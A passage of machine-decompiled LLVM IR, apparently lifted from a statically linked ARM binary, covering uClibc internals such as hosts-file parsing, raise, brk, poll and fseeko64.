  store i8 0, i8* %v3_18484, align 1
  %v4_18484 = load i32, i32* %r0.global-to-local, align 4
  %v5_18484 = add i32 %v4_18484, 1
  store i32 %v5_18484, i32* %r0.global-to-local, align 4
  %v1_18488 = inttoptr i32 %v5_18484 to i8*
  %v2_18488 = load i8, i8* %v1_18488, align 1
  %v3_18488 = zext i8 %v2_18488 to i32
  store i32 %v3_18488, i32* %r2.global-to-local, align 4
  %v2_1848c = icmp eq i8 %v2_18488, 0
  br i1 %v2_1848c, label %dec_label_pc_184b0, label %dec_label_pc_18494

dec_label_pc_18494:                               ; preds = %dec_label_pc_18488.preheader, %dec_label_pc_18480
  %v0_184a8 = phi i32 [ %v3_18488, %dec_label_pc_18480 ], [ %v3_1848823, %dec_label_pc_18488.preheader ]
  %v2_18484 = phi i32 [ %v5_18484, %dec_label_pc_18480 ], [ %v0_1848820, %dec_label_pc_18488.preheader ]
  %v2_18498 = load i32, i32* @global_var_2c58c, align 4
  %v3_1849c = mul nuw nsw i32 %v0_184a8, 2
  %v4_1849c = add i32 %v2_18498, %v3_1849c
  %v5_1849c = inttoptr i32 %v4_1849c to i8*
  %v6_1849c = load i8, i8* %v5_1849c, align 1
  %v1_184a0 = and i8 %v6_1849c, 32
  %v2_184a0 = icmp eq i8 %v1_184a0, 0
  br i1 %v2_184a0, label %dec_label_pc_184a8, label %dec_label_pc_18480

dec_label_pc_184a8:                               ; preds = %dec_label_pc_18494
  %v7_184a8 = icmp eq i32 %v0_184a8, 10
  br i1 %v7_184a8, label %dec_label_pc_18480, label %dec_label_pc_184b0

dec_label_pc_184b0:                               ; preds = %dec_label_pc_18480, %dec_label_pc_184a8, %dec_label_pc_18488.preheader
  %v0_184b434 = phi i32 [ %v0_1848820, %dec_label_pc_18488.preheader ], [ %v5_18484, %dec_label_pc_18480 ], [ %v2_18484, %dec_label_pc_184a8 ]
  %v0_184b0 = load i32, i32* @r8, align 4
  %v1_184b0 = add i32 %v0_184b0, 1
  br label %dec_label_pc_184b4

dec_label_pc_184b4:                               ; preds = %dec_label_pc_18430, %dec_label_pc_184b0
  %storemerge = phi i32 [ %v1_184b0, %dec_label_pc_184b0 ], [ 0, %dec_label_pc_18430 ]
  %v0_18448 = phi i32 [ %v0_184b434, %dec_label_pc_184b0 ], [ %v0_184b435, %dec_label_pc_18430 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_184b4 = inttoptr i32 %v0_18448 to i8*
  %v2_184b4 = load i8, i8* %v1_184b4, align 1
  %v3_184b4 = zext i8 %v2_184b4 to i32
  %v2_184b8 = icmp eq i8 %v2_184b4, 0
  br i1 %v2_184b8, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_184b4
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_184b4, %bb56
  %v0_184c8.pr = phi i32 [ %v3_184b4, %dec_label_pc_184b4 ], [ 1, %bb56 ]
  %v1_184c0 = add i32 %storemerge, -4
  %v3_184c0 = sub i32 3, %storemerge
  %v4_184c0 = and i32 %v3_184c0, %storemerge
  %v5_184c0 = icmp slt i32 %v4_184c0, 0
  %v6_184c0 = icmp slt i32 %v1_184c0, 0
  %v7_184c0 = icmp eq i32 %storemerge, 4
  %v3_184c4 = xor i1 %v6_184c0, %v5_184c0
  %v4_184c4 = or i1 %v7_184c0, %v3_184c4
  br i1 %v4_184c4, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_184d0

bb58:                                             ; preds = %bb57
  %v2_184c8 = icmp eq i32 %v0_184c8.pr, 0
  br i1 %v2_184c8, label %dec_label_pc_184d0, label %dec_label_pc_18440

dec_label_pc_184d0:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_24298.1318 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_184dc = call i32 @__GI_strcoll(i8* %v3_184dc, i32 ptrtoint ([11 x i8]* @global_var_24298.1318 to i32))
  store i32 %v4_184dc, i32* %r0.global-to-local, align 4
  %v2_184e0 = icmp eq i32 %v4_184dc, 0
  br i1 %v2_184e0, label %dec_label_pc_18508.preheader, label %dec_label_pc_1852c

dec_label_pc_18508.preheader:                     ; preds = %dec_label_pc_184d0
  br label %dec_label_pc_18508

dec_label_pc_184f0:                               ; preds = %dec_label_pc_18520
  %v1_184f0 = add i32 %v5_18510, -36
  %v2_184f0 = inttoptr i32 %v1_184f0 to i32*
  %v3_184f0 = load i32, i32* %v2_184f0, align 4
  store i32 %v3_184f0, i32* %r0.global-to-local, align 4
  %v1_184f4 = inttoptr i32 %v3_184f0 to i8*
  %v2_184f4 = call i32 @__GI_strdup(i8* %v1_184f4)
  store i32 %v2_184f4, i32* %r0.global-to-local, align 4
  %v0_184fc = load i32, i32* @r4, align 4
  %v1_184fc = add i32 %v0_184fc, 1
  store i32 %v1_184fc, i32* %r2.global-to-local, align 4
  %v5_18500 = mul i32 %v0_184fc, 4
  %v6_18500 = add i32 %v5_18500, ptrtoint (i32* @global_var_32c3c.1136 to i32)
  %v7_18500 = inttoptr i32 %v6_18500 to i32*
  store i32 %v2_184f4, i32* %v7_18500, align 4
  %v0_18504 = load i32, i32* %r2.global-to-local, align 4
  %v1_18504 = load i32, i32* @r7, align 4
  %v2_18504 = inttoptr i32 %v1_18504 to i32*
  store i32 %v0_18504, i32* %v2_18504, align 4
  %v0_1850c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18508

dec_label_pc_18508:                               ; preds = %dec_label_pc_18508.preheader, %dec_label_pc_184f0
  %v0_18518 = phi i32 [ 1, %dec_label_pc_18508.preheader ], [ %v0_1850c.pre, %dec_label_pc_184f0 ]
  store i32 %v2_18440, i32* %r2.global-to-local, align 4
  %v1_1850c = load i32, i32* @r8, align 4
  %v2_1850c = sub i32 %v0_18518, %v1_1850c
  %v4_1850c = xor i32 %v1_1850c, %v0_18518
  %v5_1850c = xor i32 %v2_1850c, %v0_18518
  %v6_1850c = and i32 %v5_1850c, %v4_1850c
  %v7_1850c = icmp slt i32 %v6_1850c, 0
  %v8_1850c = icmp slt i32 %v2_1850c, 0
  %v4_18510 = mul i32 %v0_18518, 4
  %v5_18510 = add i32 %v4_18510, %v2_18440
  store i32 ptrtoint (i32* @global_var_32c48.1133 to i32), i32* @r7, align 4
  %v1_18518 = add i32 %v0_18518, 1
  store i32 %v1_18518, i32* @r5, align 4
  %v2_1851c = xor i1 %v8_1850c, %v7_1850c
  br i1 %v2_1851c, label %dec_label_pc_18520, label %dec_label_pc_1852c

dec_label_pc_18520:                               ; preds = %dec_label_pc_18508
  %v2_18520 = load i32, i32* @global_var_32c48.1133, align 4
  store i32 %v2_18520, i32* @r4, align 4
  %v7_18528 = icmp slt i32 %v2_18520, 3
  br i1 %v7_18528, label %dec_label_pc_184f0, label %dec_label_pc_1852c

dec_label_pc_1852c:                               ; preds = %dec_label_pc_18508, %dec_label_pc_18520, %dec_label_pc_184d0
  %v0_1852c = load i32, i32* @r6, align 4
  store i32 %v0_1852c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_242a4.1321 to i32), i32* @r1, align 4
  %v3_18534 = inttoptr i32 %v0_1852c to i8*
  %v4_18534 = call i32 @__GI_strcoll(i8* %v3_18534, i32 ptrtoint ([7 x i8]* @global_var_242a4.1321 to i32))
  store i32 %v4_18534, i32* %r0.global-to-local, align 4
  %v2_18538 = icmp eq i32 %v4_18534, 0
  br i1 %v2_18538, label %dec_label_pc_18570.preheader, label %dec_label_pc_18540

dec_label_pc_18540:                               ; preds = %dec_label_pc_1852c
  %v0_18540 = load i32, i32* @r6, align 4
  store i32 %v0_18540, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_242ac.1323 to i32), i32* @r1, align 4
  %v3_18548 = inttoptr i32 %v0_18540 to i8*
  %v4_18548 = call i32 @__GI_strcoll(i8* %v3_18548, i32 ptrtoint ([7 x i8]* @global_var_242ac.1323 to i32))
  store i32 %v4_18548, i32* %r0.global-to-local, align 4
  %v2_1854c = icmp eq i32 %v4_18548, 0
  br i1 %v2_1854c, label %dec_label_pc_18570.preheader, label %dec_label_pc_185cc.backedge

dec_label_pc_18570.preheader:                     ; preds = %dec_label_pc_1852c, %dec_label_pc_18540
  store i32 ptrtoint (i32* @global_var_32c4c.1298 to i32), i32* @r4, align 4
  %v2_1857460 = load i32, i32* @global_var_32c4c.1298, align 4
  store i32 ptrtoint (i32* @global_var_32c2c.1302 to i32), i32* @r5, align 4
  %v1_1858063 = add i32 %v2_1857460, -1
  store i32 %v1_1858063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_1857460, 1
  br i1 %tmp5964, label %dec_label_pc_18588, label %dec_label_pc_18558

dec_label_pc_18558:                               ; preds = %dec_label_pc_18570.preheader, %dec_label_pc_18558
  %v1_1858065 = phi i32 [ %v1_18580, %dec_label_pc_18558 ], [ %v1_1858063, %dec_label_pc_18570.preheader ]
  %v4_18558 = mul i32 %v1_1858065, 4
  %v5_18558 = add i32 %v4_18558, ptrtoint (i32* @global_var_32c2c.1302 to i32)
  %v6_18558 = inttoptr i32 %v5_18558 to i32*
  %v7_18558 = load i32, i32* %v6_18558, align 4
  store i32 %v7_18558, i32* @r0, align 4
  store i32 %v1_1858065, i32* @global_var_32c4c.1298, align 4
  %v0_18560 = call i32 @free()
  store i32 %v0_18560, i32* %r0.global-to-local, align 4
  %v0_18564 = load i32, i32* @r4, align 4
  %v1_18564 = inttoptr i32 %v0_18564 to i32*
  %v2_18564 = load i32, i32* %v1_18564, align 4
  %v1_1856c = load i32, i32* @r5, align 4
  %v5_1856c = mul i32 %v2_18564, 4
  %v6_1856c = add i32 %v1_1856c, %v5_1856c
  %v7_1856c = inttoptr i32 %v6_1856c to i32*
  store i32 0, i32* %v7_1856c, align 4
  store i32 ptrtoint (i32* @global_var_32c4c.1298 to i32), i32* @r4, align 4
  %v2_18574 = load i32, i32* @global_var_32c4c.1298, align 4
  store i32 ptrtoint (i32* @global_var_32c2c.1302 to i32), i32* @r5, align 4
  %v1_18580 = add i32 %v2_18574, -1
  store i32 %v1_18580, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_18574, 1
  br i1 %tmp59, label %dec_label_pc_18588, label %dec_label_pc_18558

dec_label_pc_18588:                               ; preds = %dec_label_pc_18558, %dec_label_pc_18570.preheader
  br label %dec_label_pc_185a8

dec_label_pc_18590:                               ; preds = %dec_label_pc_185c0
  %v1_18590 = add i32 %v5_185b0, -36
  %v2_18590 = inttoptr i32 %v1_18590 to i32*
  %v3_18590 = load i32, i32* %v2_18590, align 4
  store i32 %v3_18590, i32* %r0.global-to-local, align 4
  %v1_18594 = inttoptr i32 %v3_18590 to i8*
  %v2_18594 = call i32 @__GI_strdup(i8* %v1_18594)
  store i32 %v2_18594, i32* %r0.global-to-local, align 4
  %v0_1859c = load i32, i32* @r4, align 4
  %v1_1859c = add i32 %v0_1859c, 1
  store i32 %v1_1859c, i32* %r2.global-to-local, align 4
  %v5_185a0 = mul i32 %v0_1859c, 4
  %v6_185a0 = add i32 %v5_185a0, ptrtoint (i32* @global_var_32c2c.1302 to i32)
  %v7_185a0 = inttoptr i32 %v6_185a0 to i32*
  store i32 %v2_18594, i32* %v7_185a0, align 4
  %v0_185a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_185a4 = load i32, i32* @r6, align 4
  %v2_185a4 = inttoptr i32 %v1_185a4 to i32*
  store i32 %v0_185a4, i32* %v2_185a4, align 4
  %v0_185ac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_185a8

dec_label_pc_185a8:                               ; preds = %dec_label_pc_18588, %dec_label_pc_18590
  %v0_185b8 = phi i32 [ 1, %dec_label_pc_18588 ], [ %v0_185ac.pre, %dec_label_pc_18590 ]
  store i32 %v2_18440, i32* %r2.global-to-local, align 4
  %v1_185ac = load i32, i32* @r8, align 4
  %v2_185ac = sub i32 %v0_185b8, %v1_185ac
  %v4_185ac = xor i32 %v1_185ac, %v0_185b8
  %v5_185ac = xor i32 %v2_185ac, %v0_185b8
  %v6_185ac = and i32 %v5_185ac, %v4_185ac
  %v7_185ac = icmp slt i32 %v6_185ac, 0
  %v8_185ac = icmp slt i32 %v2_185ac, 0
  %v4_185b0 = mul i32 %v0_185b8, 4
  %v5_185b0 = add i32 %v4_185b0, %v2_18440
  store i32 ptrtoint (i32* @global_var_32c4c.1298 to i32), i32* @r6, align 4
  %v1_185b8 = add i32 %v0_185b8, 1
  store i32 %v1_185b8, i32* @r5, align 4
  %v2_185bc = xor i1 %v8_185ac, %v7_185ac
  br i1 %v2_185bc, label %dec_label_pc_185c0, label %dec_label_pc_185cc.backedge

dec_label_pc_185c0:                               ; preds = %dec_label_pc_185a8
  %v2_185c0 = load i32, i32* @global_var_32c4c.1298, align 4
  store i32 %v2_185c0, i32* @r4, align 4
  %v7_185c8 = icmp slt i32 %v2_185c0, 4
  br i1 %v7_185c8, label %dec_label_pc_18590, label %dec_label_pc_185cc.backedge

dec_label_pc_183fc.preheader:                     ; preds = %dec_label_pc_183fc.preheader.lr.ph, %dec_label_pc_185cc.backedge
  store i32 %v2_18390, i32* %r0.global-to-local, align 4
  %v2_183fc12 = load i8, i8* %v1_183fc11, align 4
  %v3_183fc13 = zext i8 %v2_183fc12 to i32
  store i32 %v3_183fc13, i32* %r2.global-to-local, align 4
  %v2_1840014 = icmp eq i8 %v2_183fc12, 0
  br i1 %v2_1840014, label %dec_label_pc_1841c, label %dec_label_pc_18408.lr.ph

dec_label_pc_18408.lr.ph:                         ; preds = %dec_label_pc_183fc.preheader
  %v2_1840c.pre = load i32, i32* @global_var_2c58c, align 4
  br label %dec_label_pc_18408

dec_label_pc_185ec:                               ; preds = %dec_label_pc_185cc.backedge, %dec_label_pc_185cc.preheader
  %v0_185ec = load i32, i32* @sl, align 4
  store i32 %v0_185ec, i32* %r0.global-to-local, align 4
  %v1_185f0 = inttoptr i32 %v0_185ec to i8*
  %v2_185f0 = call i32 @__GI_fclose(i8* %v1_185f0)
  store i32 %v2_185f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18604

dec_label_pc_185f8:                               ; preds = %dec_label_pc_183e0
  %v0_185f8 = call i32 @__GI___h_errno_location()
  store i32 %v0_185f8, i32* %r0.global-to-local, align 4
  %v2_18600 = inttoptr i32 %v0_185f8 to i32*
  store i32 3, i32* %v2_18600, align 4
  br label %dec_label_pc_18604

dec_label_pc_18604:                               ; preds = %entry, %dec_label_pc_185ec, %dec_label_pc_185f8
  store i32 %v2_18394, i32* @r0, align 4
  %v1_18614 = call i32 @__pthread_return_void()
  store i32 %v1_18614, i32* %r0.global-to-local, align 4
  store i32 %v6_1838c, i32* @r5, align 4
  store i32 %v9_1838c, i32* @r6, align 4
  store i32 %v12_1838c, i32* @r7, align 4
  store i32 %v15_1838c, i32* @r8, align 4
  store i32 %v18_1838c, i32* @sl, align 4
  ret i32 %v1_18614

; uselistorder directives
  uselistorder i32 %v3_183fc13, { 2, 1, 0 }
  uselistorder i32 %v2_185ac, { 1, 0 }
  uselistorder i32 %v0_185b8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_18580, { 1, 0 }
  uselistorder i32 %v1_1858065, { 1, 0 }
  uselistorder i32 %v2_1850c, { 1, 0 }
  uselistorder i32 %v0_18518, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_18448, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_1848820, { 1, 0, 2 }
  uselistorder i32 %v2_18440, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_18390, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 5, 3, 4, 6, 16, 9, 7, 8, 10, 2, 11, 1, 12, 14, 13, 17, 15 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 4, 3, 20, 6, 5, 7, 9, 8, 11, 10, 13, 12, 21, 14, 15, 18, 16, 19, 23, 22, 17, 28, 27, 24, 26, 1, 25 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 15, 13, 12, 11, 10, 9, 8, 20, 19, 7, 6, 5, 4, 3, 14, 18, 17, 16, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_32c2c.1302 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_32c4c.1298, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_32c4c.1298 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_32c3c.1136 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 7, 8, 9, 10, 6, 11, 12, 13 }
  uselistorder i32* @global_var_32c48.1133, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_18604, { 2, 1, 0 }
  uselistorder label %dec_label_pc_183fc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_185a8, { 1, 0 }
  uselistorder label %dec_label_pc_18558, { 1, 0 }
  uselistorder label %dec_label_pc_18570.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1852c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18508, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_184b4, { 1, 0 }
  uselistorder label %dec_label_pc_184b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18494, { 1, 0 }
  uselistorder label %dec_label_pc_18480, { 1, 0 }
  uselistorder label %dec_label_pc_18460, { 1, 0 }
  uselistorder label %dec_label_pc_185cc.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_1841c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_185cc.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_1869c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_1869c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_186a8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_186b0 = call i32 @__libc_getpid()
  store i32 %v3_186a8, i32* @r4, align 4
  %v0_186bc = call i32 @kill()
  ret i32 %v0_186bc

; uselistorder directives
  uselistorder i32 ()* @kill, { 3, 4, 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_186c0 = add i32 %arg1, 28
  %v2_186c0 = inttoptr i32 %v1_186c0 to i32*
  %v3_186c0 = load i32, i32* %v2_186c0, align 4
  %v1_186c8 = add i32 %arg1, 44
  %v2_186c8 = inttoptr i32 %v1_186c8 to i32*
  %v3_186c8 = load i32, i32* %v2_186c8, align 4
  store i32 %v3_186c0, i32* @global_var_32c50.1328, align 4
  store i32 %v3_186c8, i32* @global_var_32c54.1330, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_186ec = call i32 @brk(i32* %arg1)
  %v3_186f0 = icmp ult i32 %v2_186ec, %tmp
  store i32 %v2_186ec, i32* @global_var_32b80.1265, align 4
  br i1 %v3_186f0, label %dec_label_pc_18704, label %dec_label_pc_18714

dec_label_pc_18704:                               ; preds = %entry
  %v0_18704 = call i32 @__errno_location()
  %v2_1870c = inttoptr i32 %v0_18704 to i32*
  store i32 12, i32* %v2_1870c, align 4
  br label %dec_label_pc_18714

dec_label_pc_18714:                               ; preds = %entry, %dec_label_pc_18704
  %v0_18714 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_18704 ]
  ret i32 %v0_18714

; uselistorder directives
  uselistorder i32* @global_var_32b80.1265, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_18714, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18720 = load i32, i32* @r4, align 4
  store i32 %v3_18720, i32* %stack_var_-8, align 4
  %v5_18724 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_18724, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_18724, -4095
  br i1 %tmp, label %dec_label_pc_18744, label %dec_label_pc_18734

dec_label_pc_18734:                               ; preds = %entry
  %v0_18734 = call i32 @__errno_location()
  %v0_18738 = load i32, i32* %r4.global-to-local, align 4
  %v1_18738 = sub i32 0, %v0_18738
  %v2_1873c = inttoptr i32 %v0_18734 to i32*
  store i32 %v1_18738, i32* %v2_1873c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18744

dec_label_pc_18744:                               ; preds = %entry, %dec_label_pc_18734
  %v0_18744 = phi i32 [ %v5_18724, %entry ], [ -1, %dec_label_pc_18734 ]
  %v2_18748 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18748, i32* @r4, align 4
  ret i32 %v0_18744

; uselistorder directives
  uselistorder i32 %v5_18724, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18744, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1874c = load i32, i32* @r2, align 4
  store i32 %v0_1874c, i32* @r3, align 4
  %v0_18754 = call i32 @__GI_fseeko64()
  ret i32 %v0_18754
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_18758 = load i32, i32* @r4, align 4
  %v6_18758 = load i32, i32* @r5, align 4
  %v9_18758 = load i32, i32* @r6, align 4
  %v0_1875c = load i32, i32* @r3, align 4
  %v2_18760 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_1875c, i32* @r6, align 4
  %v0_18768 = load i32, i32* @r0, align 4
  store i32 %v0_18768, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1875c, 3
  br i1 %tmp, label %dec_label_pc_18784, label %dec_label_pc_18770

dec_label_pc_18770:                               ; preds = %entry
  %v0_18770 = call i32 @__errno_location()
  store i32 %v0_18770, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_1877c = inttoptr i32 %v0_18770 to i32*
  store i32 22, i32* %v2_1877c, align 4
  br label %.thread3

dec_label_pc_18784:                               ; preds = %entry
  %v1_18784 = add i32 %v0_18768, 52
  %v2_18784 = inttoptr i32 %v1_18784 to i32*
  %v3_18784 = load i32, i32* %v2_18784, align 4
  store i32 %v3_18784, i32* %r7.global-to-local, align 4
  %v2_18788 = icmp eq i32 %v3_18784, 0
  %v0_1878c = load i32, i32* @r1, align 4
  store i32 %v0_1878c, i32* %stack_var_-28, align 4
  br i1 %v2_18788, label %dec_label_pc_18798, label %dec_label_pc_187c4

dec_label_pc_18798:                               ; preds = %dec_label_pc_18784
  %v1_18798 = add i32 %v0_18768, 56
  store i32 %v1_18798, i32* @r4, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  store i32 %v2_18760, i32* @r0, align 4
  store i32 %v1_18798, i32* %r2.global-to-local, align 4
  %v1_187b0 = call i32 @__pthread_return_void()
  %v0_187b4 = load i32, i32* @r4, align 4
  store i32 %v0_187b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_15fd4.997 to i32), i32* %r3.global-to-local, align 4
  store i32 100292, i32* @lr, align 4
  %v1_187c0 = call i32 @__pthread_return_0()
  store i32 %v1_187c0, i32* %r0.global-to-local, align 4
  %v0_187c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_187c4

dec_label_pc_187c4:                               ; preds = %dec_label_pc_18784, %dec_label_pc_18798
  %v0_187d0 = phi i32 [ %v0_18768, %dec_label_pc_18784 ], [ %v0_187c4.pre, %dec_label_pc_18798 ]
  %v1_187c4 = inttoptr i32 %v0_187d0 to i8*
  %v2_187c4 = load i8, i8* %v1_187c4, align 1
  %v3_187c4 = zext i8 %v2_187c4 to i32
  store i32 %v3_187c4, i32* %r3.global-to-local, align 4
  %v1_187c8 = and i32 %v3_187c4, 64
  %v2_187c8 = icmp eq i32 %v1_187c8, 0
  br i1 %v2_187c8, label %dec_label_pc_187e0, label %dec_label_pc_187d0

dec_label_pc_187d0:                               ; preds = %dec_label_pc_187c4
  store i32 %v0_187d0, i32* @r0, align 4
  %v0_187d4 = call i32 @__stdio_wcommit()
  store i32 %v0_187d4, i32* %r0.global-to-local, align 4
  %v2_187d8 = icmp eq i32 %v0_187d4, 0
  br i1 %v2_187d8, label %dec_label_pc_187e0, label %dec_label_pc_18850

dec_label_pc_187e0:                               ; preds = %dec_label_pc_187d0, %dec_label_pc_187c4
  %v0_187e0 = load i32, i32* @r6, align 4
  %v7_187e0 = icmp eq i32 %v0_187e0, 1
  br i1 %v7_187e0, label %dec_label_pc_187e8, label %dec_label_pc_187e0.dec_label_pc_187fc_crit_edge

dec_label_pc_187e0.dec_label_pc_187fc_crit_edge:  ; preds = %dec_label_pc_187e0
  br label %dec_label_pc_187fc

dec_label_pc_187e8:                               ; preds = %dec_label_pc_187e0
  %v0_187e8 = load i32, i32* @r5, align 4
  store i32 %v0_187e8, i32* %r0.global-to-local, align 4
  %v2_187ec = ptrtoint i32* %stack_var_-28 to i32
  %v2_187f0 = inttoptr i32 %v0_187e8 to i8*
  %v3_187f0 = call i32 @__stdio_adjust_position(i8* %v2_187f0, i32 %v2_187ec)
  store i32 %v3_187f0, i32* %r0.global-to-local, align 4
  %v1_187f4 = icmp slt i32 %v3_187f0, 0
  br i1 %v1_187f4, label %dec_label_pc_18850, label %dec_label_pc_187e8.dec_label_pc_187fc_crit_edge

dec_label_pc_187e8.dec_label_pc_187fc_crit_edge:  ; preds = %dec_label_pc_187e8
  %v0_187fc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_187fc

dec_label_pc_187fc:                               ; preds = %dec_label_pc_187e0.dec_label_pc_187fc_crit_edge, %dec_label_pc_187e8.dec_label_pc_187fc_crit_edge
  %v0_187fc = phi i32 [ %v0_187e0, %dec_label_pc_187e0.dec_label_pc_187fc_crit_edge ], [ %v0_187fc.pre, %dec_label_pc_187e8.dec_label_pc_187fc_crit_edge ]
  store i32 %v0_187fc, i32* %r2.global-to-local, align 4
  %v0_18800 = load i32, i32* @r5, align 4
  store i32 %v0_18800, i32* %r0.global-to-local, align 4
  %v4_18808 = call i32 @__stdio_seek(i32 %v0_18800, i32* nonnull %stack_var_-28, i32 %v0_187fc)
  store i32 %v4_18808, i32* %r0.global-to-local, align 4
  %v1_1880c = icmp slt i32 %v4_18808, 0
  br i1 %v1_1880c, label %dec_label_pc_18850, label %dec_label_pc_18814

dec_label_pc_18814:                               ; preds = %dec_label_pc_187fc
  %v0_18814 = load i32, i32* @r5, align 4
  %v1_18814 = inttoptr i32 %v0_18814 to i32*
  %v2_18814 = load i32, i32* %v1_18814, align 4
  store i32 %v2_18814, i32* %r3.global-to-local, align 4
  %v1_18818 = add i32 %v0_18814, 8
  %v2_18818 = inttoptr i32 %v1_18818 to i32*
  %v3_18818 = load i32, i32* %v2_18818, align 4
  store i32 %v3_18818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_18820 = and i32 %v2_18814, -72
  store i32 %v1_18820, i32* %r3.global-to-local, align 4
  %v3_18824 = sdiv i32 %v2_18814, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1882c = trunc i32 %v3_18824 to i8
  %v3_1882c = add i32 %v0_18814, 1
  %v4_1882c = inttoptr i32 %v3_1882c to i8*
  store i8 %v1_1882c, i8* %v4_1882c, align 1
  %v0_18830 = load i32, i32* %r2.global-to-local, align 4
  %v1_18830 = load i32, i32* @r5, align 4
  %v2_18830 = add i32 %v1_18830, 28
  %v3_18830 = inttoptr i32 %v2_18830 to i32*
  store i32 %v0_18830, i32* %v3_18830, align 4
  %v0_18834 = load i32, i32* %r0.global-to-local, align 4
  %v1_18834 = trunc i32 %v0_18834 to i8
  %v2_18834 = load i32, i32* @r5, align 4
  %v3_18834 = add i32 %v2_18834, 2
  %v4_18834 = inttoptr i32 %v3_18834 to i8*
  store i8 %v1_18834, i8* %v4_18834, align 1
  %v0_18838 = load i32, i32* %r3.global-to-local, align 4
  %v1_18838 = trunc i32 %v0_18838 to i8
  %v2_18838 = load i32, i32* @r5, align 4
  %v3_18838 = inttoptr i32 %v2_18838 to i8*
  store i8 %v1_18838, i8* %v3_18838, align 1
  %v0_1883c = load i32, i32* %r2.global-to-local, align 4
  %v1_1883c = load i32, i32* @r5, align 4
  %v2_1883c = add i32 %v1_1883c, 16
  %v3_1883c = inttoptr i32 %v2_1883c to i32*
